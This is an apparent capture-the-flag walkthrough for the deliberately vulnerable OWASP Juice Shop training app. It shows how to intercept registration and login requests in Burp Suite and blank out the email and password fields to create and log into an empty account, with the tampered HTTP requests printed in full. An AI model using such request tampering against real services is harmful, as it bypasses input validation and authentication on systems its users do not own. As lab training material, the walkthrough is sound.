# Empty User Registration

***2 Star Challenge 4/23***

Register a user with an empty email and password.

---

- Burpsuite

1. Open the tool `burpsuite`, go to Proxy and start the Browser with the **Juice Shop**.

2. Navigate to **Login** and enter [Not yet a customer?](http://localhost:3000/#/register).

3. Fill out the Register from with fake data. 

4. Bevor you submit the form, switch into `burpsuite` and start **"Intercept on"** .

5. Submit the form with click on "Register". 

6. Forward the request an take a look into it.

`````bash
POST /api/Users/ HTTP/1.1
Host: 127.0.0.1:3000
Content-Length: 254
Accept-Language: de-DE,de;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Origin: http://192.168.178.33:3000
Referer: http://192.168.178.33:3000/
Accept-Encoding: gzip, deflate, br
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=YBJ6403etotycMfmH1ouNBtJRImnu6NILEFEPt7YfYqF4buNVIWkuqXd13j5
Connection: keep-alive

{
  "email":"jonny23@gmail.com",
  "password":"jonny",
  "passwordRepeat":"jonny",
  "securityQuestion":{
    "id":3,
    "question":"Mother's birth date? (MM/DD/YY)",
    "createdAt":"2025-07-17T12:44:54.599Z",
    "updatedAt":"2025-07-17T12:44:54.599Z"
  },
"securityAnswer":"02.22.1922"
}
`````

7. Manipulate the request data, edit the value of "email", "pwassword" and "passwordRepeat" to an empty string.


`````bash
POST /api/Users/ HTTP/1.1
Host: 127.0.0.1:3000
Content-Length: 254
Accept-Language: de-DE,de;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Origin: http://192.168.178.33:3000
Referer: http://192.168.178.33:3000/
Accept-Encoding: gzip, deflate, br
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=YBJ6403etotycMfmH1ouNBtJRImnu6NILEFEPt7YfYqF4buNVIWkuqXd13j5
Connection: keep-alive

{
  "email":"",             <-- delete value
  "password":"",          <-- delete value
  "passwordRepeat":"",    <-- delete value
  "securityQuestion":{
    "id":3,
    "question":"Mother's birth date? (MM/DD/YY)",
    "createdAt":"2025-07-17T12:44:54.599Z",
    "updatedAt":"2025-07-17T12:44:54.599Z"
  },
"securityAnswer":"02.22.1922"
}
`````
8. Forward the request again and go back to the **Juice Shop** page.


:::success Challenge completed!
You successfully solved a challenge: Empty User Registration (Register a user with an empty email and password.)
:::

---

To Login with this "Empty User" Account.

Repeat the steps. 

1. Go to Login page.

2. Enter some random values.

3. Start **Intercept on** in your `burpsuite`.
4. Submit the Login form.
5. Forword your Proxy
6. Remove the values in the request.

````bash
POST /rest/user/login HTTP/1.1
Host: 192.168.178.33:3000
Content-Length: 34
Accept-Language: de-DE,de;q=0.9
Accept: application/json, text/plain, */*
Content-Type: application/json
User-Agent: Mozilla/5.0 (X11; linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
Origin: http://192.168.178.33:3000
Referer: http://192.168.178.33:3000/
Accept-Encoding: gzip, deflate, br
Cookie: language=en; welcomebanner_status=dismiss; cookieconsent_status=dismiss; continueCode=YBJ6403etotycMfmH1ouNBtJRImnu6NILEFEPt7YfYqF4buNVIWkuqXd13j5
Connection: keep-alive

{
  "email":"asdf",       <--- Remove
  "password":"asdf"     <--- Remove
}
````
7. Forward again.
8. Now your are logged in as "" user.